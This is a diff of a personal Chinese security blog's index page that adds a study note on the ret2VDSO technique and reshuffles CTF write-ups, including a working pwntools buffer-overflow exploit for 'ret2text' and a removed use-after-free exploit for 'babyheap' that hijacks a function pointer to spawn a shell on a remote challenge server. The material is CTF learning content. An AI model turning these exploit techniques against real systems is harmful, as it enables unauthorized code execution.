@@ -172,7 +172,7 @@
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
         <a href="/archives/">
-          <span class="site-state-item-count">21</span>
+          <span class="site-state-item-count">22</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
@@ -200,6 +200,141 @@
     </div>
 
     <div class="main-inner index posts-expand">
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="http://whoamiuu.github.io/2026/01/30/2026-01-30-ret2VDSO%20%E6%8A%80%E6%9C%AF/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Whoamiuu's Blogs">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content=" | Whoamiuu's Blogs">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2026/01/30/2026-01-30-ret2VDSO%20%E6%8A%80%E6%9C%AF/" class="post-title-link" itemprop="url">学习笔记：ret2VDSO技术</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+
+      <time title="Created: 2026-01-30 10:00:00" itemprop="dateCreated datePublished" datetime="2026-01-30T10:00:00+08:00">2026-01-30</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">Edited on</span>
+      <time title="Modified: 2026-02-03 21:47:10" itemprop="dateModified" datetime="2026-02-03T21:47:10+08:00">2026-02-03</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/Notes/" itemprop="url" rel="index"><span itemprop="name">Notes</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h1 id="ret2VDSO-技术"><a href="#ret2VDSO-技术" class="headerlink" title="ret2VDSO 技术"></a>ret2VDSO 技术</h1><h2 id="一、例子"><a href="#一、例子" class="headerlink" title="一、例子"></a>一、例子</h2><p>好像 ret2VDSO 都是32位的例子，而且较新内核似乎无法完成 ret2VDSO，这里先了解一下吧</p>
+<h2 id="二、原理"><a href="#二、原理" class="headerlink" title="二、原理"></a>二、原理</h2><h3 id="i-简介"><a href="#i-简介" class="headerlink" title="i 简介"></a>i 简介</h3><ol>
+<li><em>VDSO (Virtual Dynamically-linked Shared Object)</em>：Linux 内核在用户空间映射的一段特殊共享库，通常显示为 <code>linux-vdso.so.1</code> 或 <code>linux-gate.so.1</code>。</li>
+<li>为了提供一些常用系统调用的用户态快速实现（如 <code>gettimeofday</code>、<code>clock_gettime</code>），避免频繁的用户态&#x2F;内核态切换。</li>
+<li>虽然表现为一个 <code>.so</code> 文件，但它并不存在于磁盘上，而是由内核在进程启动时映射到内存。</li>
+</ol>
+<h3 id="ii-补充"><a href="#ii-补充" class="headerlink" title="ii 补充"></a>ii 补充</h3><ol>
+<li>VDSO属于操作系统，它由内核生成，是内核在运行时动态构造并映射到进程地址空间。</li>
+<li>几乎每个用户态进程都会有一块 VDSO 区域，地址可能不同（受 ASLR 影响），但内容由内核统一提供。</li>
+<li>你的程序不需要显式链接 VDSO，内核会自动把它映射进去。即使你写一个最简单的 <code>int main(){return 0;}</code>，运行时也会有 VDSO。<em>就是说程序只是使用内核提供的VDSO共享区域，而不是像 ret2dlresolve 的符号表那样由程序生成</em></li>
+<li>与其说VDSO是一个共享库，不如说VDSO是内核映射出的一个共享区域(共享内存)，里面包含了一小段真正的可执行代码（ELF 格式的共享对象），提供一些常用系统调用的用户态实现。</li>
+</ol>
+<h2 id="三、调试"><a href="#三、调试" class="headerlink" title="三、调试"></a>三、调试</h2><p>首先简单说一下命令（最底层的接口，gdb 的 vmmap也可以找到）</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> /proc/self/maps → 输出当前进程的内存映射信息。</span><br><span class="line"></span><br><span class="line"><span class="built_in">cat</span> /proc/self/auxv → 输出当前进程的 ELF 辅助向量信息。</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<h4 id="proc"><a href="#proc" class="headerlink" title="/proc"></a><code>/proc</code></h4><ul>
+<li>这是 Linux 的 <em>进程信息伪文件系统</em>（procfs）。</li>
+<li>作用：它不是存放在磁盘上的真实文件，而是内核提供的一种接口，用来查看和操作进程、内核状态。</li>
+<li>特点：里面的文件和目录都是动态生成的，反映的是系统当前的运行状态。</li>
+</ul>
+<h4 id="proc-self"><a href="#proc-self" class="headerlink" title="/proc/self"></a><code>/proc/self</code></h4><ul>
+<li><code>self</code> 是一个特殊的符号链接，始终指向 <em>当前进程的目录</em>。</li>
+<li>作用：在 <code>/proc</code> 下，每个进程都有一个以 PID 命名的目录，比如 <code>/proc/1234</code>。<ul>
+<li>如果你在进程 A 中访问 <code>/proc/self</code>，它就等价于 <code>/proc/&lt;A的PID&gt;</code>。</li>
+</ul>
+</li>
+</ul>
+<h4 id="proc-self-maps"><a href="#proc-self-maps" class="headerlink" title="/proc/self/maps"></a><code>/proc/self/maps</code></h4><ul>
+<li><code>maps</code> 指当前进程的 <em>内存映射表</em>。</li>
+<li>作用：列出进程地址空间中所有的内存区域，包括：<ul>
+<li>程序代码段、数据段</li>
+<li>堆 (<code>[heap]</code>)</li>
+<li>栈 (<code>[stack]</code>)</li>
+<li>动态库（如 libc）</li>
+<li>特殊区域（如 <code>[vdso]</code>）</li>
+</ul>
+</li>
+</ul>
+<h4 id="proc-self-auxv"><a href="#proc-self-auxv" class="headerlink" title="/proc/self/auxv"></a><code>/proc/self/auxv</code></h4><ul>
+<li><code>auxv</code>当前进程的 <strong>ELF 辅助向量</strong>。</li>
+<li>作用：这是内核在进程启动时传递给用户态的一组参数，包含运行环境信息，比如：<ul>
+<li><code>AT_SYSINFO_EHDR</code> → VDSO 的基址</li>
+<li><code>AT_EXECFN</code> → 可执行文件路径</li>
+<li><code>AT_PLATFORM</code> → CPU 架构</li>
+<li><code>AT_PAGESZ</code> → 页大小</li>
+</ul>
+</li>
+<li>用途：程序或调试器可以通过它直接获取 VDSO 基址、随机数种子等信息。</li>
+</ul>
+</blockquote>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
 
     
 
@@ -1341,100 +1476,6 @@
   
 
   <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="http://whoamiuu.github.io/2025/12/05/2025-12-07-ret2text/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Whoamiuu's Blogs">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content=" | Whoamiuu's Blogs">
-      <meta itemprop="description" content="">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/2025/12/05/2025-12-07-ret2text/" class="post-title-link" itemprop="url">CTF题解：ret2text</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">Posted on</span>
-
-      <time title="Created: 2025-12-05 10:00:00" itemprop="dateCreated datePublished" datetime="2025-12-05T10:00:00+08:00">2025-12-05</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar-check"></i>
-      </span>
-      <span class="post-meta-item-text">Edited on</span>
-      <time title="Modified: 2025-12-08 00:57:27" itemprop="dateModified" datetime="2025-12-08T00:57:27+08:00">2025-12-08</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-folder"></i>
-      </span>
-      <span class="post-meta-item-text">In</span>
-        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/Writeup/" itemprop="url" rel="index"><span itemprop="name">Writeup</span></a>
-        </span>
-    </span>
-
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <h1 id="ret2text"><a href="#ret2text" class="headerlink" title="ret2text"></a>ret2text</h1><p><img src="/images/ret2text/vuln.png" alt="image-20251201141623225"></p>
-<p><img src="/images/ret2text/printf.png" alt="image-20251201141553974"></p>
-<p>直接看反编译，如果local_c为0x1337c0de直接获得flag，并且gets读入无限制，通过填充local_58去覆盖local_c即可</p>
-<p>exp如下</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#python代码</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">sh = remote(<span class="string">&#x27;154.94.237.159&#x27;</span>,<span class="number">34540</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">70</span>, <span class="number">80</span>):</span><br><span class="line">    sh = remote(<span class="string">&#x27;154.94.237.159&#x27;</span>,<span class="number">34540</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">b&#x27;Enter Dexter\&#x27;s password: &#x27;</span>)</span><br><span class="line"></span><br><span class="line">    payload = <span class="string">b&#x27;a&#x27;</span>*i + p32(<span class="number">0x1337c0de</span>)</span><br><span class="line">    sh.sendline(payload)</span><br><span class="line">    response = sh.recvline()</span><br><span class="line">    sh.close()</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> <span class="string">b&#x27;Access granted&#x27;</span> <span class="keyword">in</span> response:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Success! Offset = <span class="subst">&#123;i&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="comment"># 获取flag</span></span><br><span class="line">        sh.interactive()</span><br></pre></td></tr></table></figure>
-
-
-
-<p>运行结果</p>
-<p><img src="/images/ret2text/flag.png" alt="image-20251201142722954"></p>
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
     <link itemprop="mainEntityOfPage" href="http://whoamiuu.github.io/2025/12/05/2025-12-07-fmt/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1579,7 +1620,7 @@
   
 
   <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="http://whoamiuu.github.io/2025/12/04/2025-12-07-babyheap/">
+    <link itemprop="mainEntityOfPage" href="http://whoamiuu.github.io/2025/12/05/2025-12-07-ret2text/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar.gif">
@@ -1597,7 +1638,7 @@
     </span>
       <header class="post-header">
         <h2 class="post-title" itemprop="name headline">
-          <a href="/2025/12/04/2025-12-07-babyheap/" class="post-title-link" itemprop="url">CTF题解: babyheap</a>
+          <a href="/2025/12/05/2025-12-07-ret2text/" class="post-title-link" itemprop="url">CTF题解：ret2text</a>
         </h2>
 
         <div class="post-meta-container">
@@ -1608,14 +1649,14 @@
       </span>
       <span class="post-meta-item-text">Posted on</span>
 
-      <time title="Created: 2025-12-04 09:33:10" itemprop="dateCreated datePublished" datetime="2025-12-04T09:33:10+08:00">2025-12-04</time>
+      <time title="Created: 2025-12-05 10:00:00" itemprop="dateCreated datePublished" datetime="2025-12-05T10:00:00+08:00">2025-12-05</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
         <i class="far fa-calendar-check"></i>
       </span>
       <span class="post-meta-item-text">Edited on</span>
-      <time title="Modified: 2026-02-03 21:48:36" itemprop="dateModified" datetime="2026-02-03T21:48:36+08:00">2026-02-03</time>
+      <time title="Modified: 2025-12-08 00:57:27" itemprop="dateModified" datetime="2025-12-08T00:57:27+08:00">2025-12-08</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -1637,21 +1678,16 @@
     
     
     <div class="post-body" itemprop="articleBody">
-          <h1 id="babyheap"><a href="#babyheap" class="headerlink" title="babyheap"></a>babyheap</h1><p><img src="/images/babyheap/checksec.png" alt="checksec">检查发现无pie，并且程序中有后门函数magic，通过反编译发现存在UAF漏洞，可以控制函数指针跳转到magic函数得到shell，具体如下</p>
-<p><img src="/images/babyheap/disassemble.png" alt="disassemble"></p>
-<p>在add_note里，用户可以控制分配大小，并且前面分配16字节用于存储指针print_note_content。</p>
-<p><img src="/images/babyheap/free.png" alt="free"></p>
-<p>（图一）</p>
-<p><img src="/images/babyheap/pointer.png" alt="pointer"></p>
-<p>（图二）</p>
-<p>del_note这里（图一），free了之前分配的块，但是指针依然指向之前申请的堆块，于是我们可以覆盖这处堆块为magic地址，再用print_note里调用指针（图二），通过指针跳转到magic获得shell。</p>
+          <h1 id="ret2text"><a href="#ret2text" class="headerlink" title="ret2text"></a>ret2text</h1><p><img src="/images/ret2text/vuln.png" alt="image-20251201141623225"></p>
+<p><img src="/images/ret2text/printf.png" alt="image-20251201141553974"></p>
+<p>直接看反编译，如果local_c为0x1337c0de直接获得flag，并且gets读入无限制，通过填充local_58去覆盖local_c即可</p>
 <p>exp如下</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(&#x27;./attachment&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;154.94.237.159&#x27;</span>,<span class="number">34278</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;info&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 无PIE，后门函数 magic()的固定地址</span></span><br><span class="line">MAGIC = <span class="number">0x400c4b</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size, content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Your choice :&#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Note size :&#x27;</span>, <span class="built_in">str</span>(size).encode())</span><br><span class="line">    p.sendafter(<span class="string">b&#x27;Content :&#x27;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Your choice :&#x27;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Index :&#x27;</span>, <span class="built_in">str</span>(idx).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Your choice :&#x27;</span>, <span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Index :&#x27;</span>, <span class="built_in">str</span>(idx).encode())</span><br><span class="line"></span><br><span class="line"><span class="comment"># 1) 准备两个 note（它们的 note_struct 都是 malloc(0x10)，加上后面的malloc(0x20)（content_buf）</span></span><br><span class="line">add(<span class="number">0x20</span>, <span class="string">b&#x27;A&#x27;</span>*<span class="number">8</span>)  <span class="comment"># index 0</span></span><br><span class="line">add(<span class="number">0x20</span>, <span class="string">b&#x27;B&#x27;</span>*<span class="number">8</span>)  <span class="comment"># index 1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 2) 依次释放：先释放 index 0，再释放 index 1</span></span><br><span class="line"><span class="comment">#    这样 tcache[0x20] 的顶端是 index 1 的 note_struct</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 3) 新增一个 note：第一次 malloc(0x10)（新 note_struct）会拿走 index 1 的旧结构，</span></span><br><span class="line"><span class="comment">#    接着 malloc(0x10)（content_buf）会拿走 index 0 的旧结构（我们要覆盖的结构）</span></span><br><span class="line">payload = p64(MAGIC) + p64(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0x10</span>, payload)  <span class="comment"># 这里的 content 指针将指向 index 0 的旧 note_struct，完成函数指针覆盖</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 4) 触发 UAF：调用 notelist[0]-&gt;print_func()，实际跳转到 magic()</span></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#python代码</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">sh = remote(<span class="string">&#x27;154.94.237.159&#x27;</span>,<span class="number">34540</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">70</span>, <span class="number">80</span>):</span><br><span class="line">    sh = remote(<span class="string">&#x27;154.94.237.159&#x27;</span>,<span class="number">34540</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">b&#x27;Enter Dexter\&#x27;s password: &#x27;</span>)</span><br><span class="line"></span><br><span class="line">    payload = <span class="string">b&#x27;a&#x27;</span>*i + p32(<span class="number">0x1337c0de</span>)</span><br><span class="line">    sh.sendline(payload)</span><br><span class="line">    response = sh.recvline()</span><br><span class="line">    sh.close()</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> <span class="string">b&#x27;Access granted&#x27;</span> <span class="keyword">in</span> response:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Success! Offset = <span class="subst">&#123;i&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="comment"># 获取flag</span></span><br><span class="line">        sh.interactive()</span><br></pre></td></tr></table></figure>
 
 
 
-
-
+<p>运行结果</p>
+<p><img src="/images/ret2text/flag.png" alt="image-20251201142722954"></p>
 
       
     </div>
